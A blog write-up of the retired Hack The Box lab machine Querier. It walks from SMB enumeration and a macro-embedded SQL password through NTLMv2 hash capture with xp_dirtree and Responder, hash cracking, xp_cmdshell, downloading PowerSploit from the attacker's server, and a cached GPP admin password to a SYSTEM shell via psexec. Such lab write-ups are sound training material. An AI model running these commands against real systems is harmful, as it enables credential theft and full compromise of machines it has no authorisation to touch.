---
layout: post
author: jseals
title: "Querier: Hack The Box Walk-through"
image: htb-querier/querier.png
---

## Background

Querier is a retired "vulnerable by design" machine created by [mrh4sh][1] and [egre55][2] and hosted at [hackthebox.eu][3]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in C:\Users\%USER%\Desktop\user.txt) and escalate privileges to root (get the flag in C:\Users\Administrator\Desktop\root.txt).

## Victim Machine Specs

![querier.png](/assets/images/posts/htb-querier/querier.png)

## Reconnaissance

Let's begin by doing a full port scan on the victim machine using masscan:

```text
~/ctf/htb/querier λ sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.10.125 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-07 18:52:58 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
```

We can follow it up with a nmap scan for more details on the services running on these ports. I've excluded the high ports found as they're MS RPC and not interesting:

```text
~/ctf/htb/querier λ sudo nmap -sS -sV 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-07 13:54 CDT
Nmap scan report for 10.10.10.125
Host is up (0.051s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server vNext tech preview 14.00.1000
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

Looks like SMB and MSSQL are running on our victim machine. Let's remember the SQL instance for later and start with enumerating the SMB share first using the guest account (no authentication required):

```text
~/ctf/htb/querier λ smbmap -u 'guest' -H 10.10.10.125
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.125...
[+] IP: 10.10.10.125:445	Name: querier.htb.local
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	Reports                                           	READ ONLY
```

We see a "Reports" share that's open to the guest account with read only access. Let's check out the contents by mapping it to our attacking machine:

```text
~/ctf/htb/querier λ sudo mkdir /mnt/querier
~/ctf/htb/querier λ sudo mount -t cifs //10.10.10.125/Reports /mnt/querier -o username=guest
~/ctf/htb/querier λ cd /mnt/querier
/mnt/querier λ ls
'Currency Volume Report.xlsm'
```

The "xlsm" extension is a macro enabled excel spreadsheet file. Since the "xlsx" and the macro enabled "xlsm" equivalents are essentially zip files, let's unzip it and examine the contents; specifically the macro portion:

```text
unzip "Currency Volume Report.xlsm"
```

The macro portion is usually contained in a file called vbaProject.bin, so let's simply run strings against the binary:

```text
strings xl/vbaProject.bin
```

In the strings output it's clear this spreadsheet reaches out to a database as we see database credentials and other connection logic:

```text
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c
```

It's safe to assume we can connect to the database we found during our initial port / service scan using these credentials. Let's use impacket's [mssqlclient.py][4] script as our SQL client / shell:

```text
~/ctf/htb/querier/xlsm/xl λ python /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth  
 -debug -db volume QUERIER/reporting@10.10.10.125
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

## Credential Harvesting

The credentials we found worked. We quickly find out we don't have many privileges and cannot run the infamous "xp_cmdshell" to execute commands as the "reporting" user, so we'll have to find another way to the user flag. There's a commonly used method of obtaining NTLM hashes using dirtree and responder, let's try that. First we'll setup our responder listener on our attacking machine:

```text
~/ctf/htb/querier λ sudo responder -I tun0
[+] Listening for events..
```

Responder is now listening for SMB connection attempts among many other things. Next, let's execute the dirtree command from the SQL prompt. This will attempt to connect to our fake SMB share that responder is serving on our attacking machine:

```text
SQL> EXEC MASTER.sys.xp_dirtree '\\10.10.33.33\fakeshare'
```

Responder tricks the victim machine into thinking it's a valid SMB share, therefore as part of the SMB connection it sends the NTLMv2 hash of the user account running the MSSQL service we're executing the dirtree command as. Back on our responder listener command prompt, we get the request with the NTLMv2 hash:

```text
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:39233d0605b79345:A1D5AE507111BE171E97286A7CC3F256:0101  
000000000000C0653150DE09D201C57A7DBA4441AA79000000000200080053004D004200330001001E00570049004E002D00500  
052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049  
004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C0005001  
40053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000  
00000000000000300000C356AB6C8D2E51E4E0341CB545E722DF496ED258A3A0BCDB2EA4A6293FA0D6B70A00100000000000000  
0000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310030000000000000  
00000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::9400d0376e4e24a0::
[*] Skipping previously captured hash for \g
```

This is great. NTLMv2 hashes include the username in the hash, so we see "mssql-svc" is running the MSSQL instance so that's the user hash we received. I have a beefy GeForce RTX 2080 GPU and hashcat can crack these hashes using purely GPU, so let's copy the hash to that machine and attempt to crack it using the rockyou.txt password list:

```text
λ ./hashcat64.exe -m 5600 ntlmv2 rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce RTX 2080, 2048/8192 MB allocatable, 46MCU

MSSQL-SVC::QUERIER:39233d0605b79345:a1d5ae507111be171e97286a7cc3f256:0101000000000000c0653150de09d201c  
57a7dba4441aa79000000000200080053004d004200330001001e00570049004e002d005000520048003400390032005200510  
04100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d0050005200480034003  
9003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c0  
06f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c356a  
b6c8d2e51e4e0341cb545e722df496ed258a3a0bcdb2ea4a6293fa0d6b70a00100000000000000000000000000000000000090  
0200063006900660073002f00310030002e00310030002e00310034002e0031003000000000000000000000000000:  
corporate568
```

The GPU makes short work of the hash and cracks it quickly. We find the password is "corporate568". Perhaps this user has more privileges than the "reporting" user we were previously logged in as. Let's log back into the MSSQL service as the "mssql-svc" user and check:

```text
~/ctf/htb/querier/xlsm/xl λ python /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth  
-debug -db volume QUERIER/mssql-svc@10.10.10.125
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

Nice, we're logged in as the new user "mssql-svc". Can we now enable xp_cmdshell with our new user?

```text
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1.  
Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the  
RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell whoami
output
--------------------------------------------------------------------------------   
querier\mssql-svc
NULL
SQL>
```

We sure can! We're now able to run commands through the SQL client as if we had a cmd shell on the victim machine. Given that, the user flag should be ours:

```text
SQL> xp_cmdshell type C:\Users\mssql-svc\Desktop\user.txt
output
--------------------------------------------------------------------------------
c37b41bb6{truncated} <--- User flag!
NULL
SQL>
```

## Privilege Escalation

We have user level access now. Let's now finish this and go for SYSTEM level access. [Powersploit][5] is a collection of powershell scripts that can be used in attacks / penetration tests such as this. We'll specifically want to use the "Privesc" module which scans the victim machine for misconfigurations and other privilege escalation opportunities. The first step is to see where we need to place the powershell module to be able to execute it, and this is done by seeing which modules directories are in PATH:

```text
SQL> xp_cmdshell powershell -command "& { echo $Env:PSModulePath }
output
--------------------------------------------------------------------------------
C:\Users\mssql-svc\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;  
C:\Windows\system32\WindowsPowerShell\v1.0\Modules;  
C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
```

It's safe to use the user's modules path as we know we'll have read/write access there. On our attacking machine, let's setup a simple web-server to serve our powershell scripts:

```text
~/ctf/htb/querier λ python -m SimpleHTTPServer 8080
Serving HTTP on 10.10.33.33 port 8080 ...
```

Next, we need to download the scripts to the victim machine from our attacking machine's web-server we just started:

```text
SQL> xp_cmdshell powershell -command "& { iwr http://10.10.33.33:8080/Get-System.ps1 -OutFile 
 C:\Users\mssql-svc\Documents\Get-System.ps1 }"
SQL> xp_cmdshell move C:\Users\mssql-svc\Documents\* C:\Users\mssql-svc\Documents\WindowsPowerShell\  
Modules\Privesc\
```

We repeat this process for all files in the "Privesc" module until the victim machine has the complete module. Note, I first had to download them to a separate folder, then move them to the modules folder in PATH as powershell was complaining the command was too long. After transferring all of the files, we import and then run the module with the "Invoke-AllChecks" argument so that it tries every avenue of escalation:

```text
SQL> xp_cmdshell powershell -exec bypass -command "& { Import-Module Privesc; Invoke-AllChecks |  
Out-File -Encoding ASCII C:\Users\mssql-svc\Documents\checks.txt} "

[*] Checking for cached Group Policy Preferences .xml files....
NULL
NULL
Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml  
```

The module gets a hit and finds the Administrator password cached in a file related to group policy preferences. Let's now continue our use of impacket, but try their [psexec][6] script this time to login as Administrator and get a command prompt:

```text
~/ctf/htb/querier λ python /usr/share/doc/python-impacket/examples/psexec.py Administrator@10.10.10.125 cmd
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file KDeIoUIg.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service ccNr on 10.10.10.125.....
[*] Starting service ccNr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We login using the Administrator account and type in the password we just found and it works. We run a "whoami" command and we're happy to see we now have SYSTEM level access. The root / SYSTEM flag is ours:

```text
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
b19c3794f7{truncated} <---- SYSTEM / root flag! We now completely own the machine and have full access
```





[1]: https://www.hackthebox.eu/home/users/profile/2570
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu
[4]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
[5]: https://github.com/PowerShellMafia/PowerSploit
[6]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
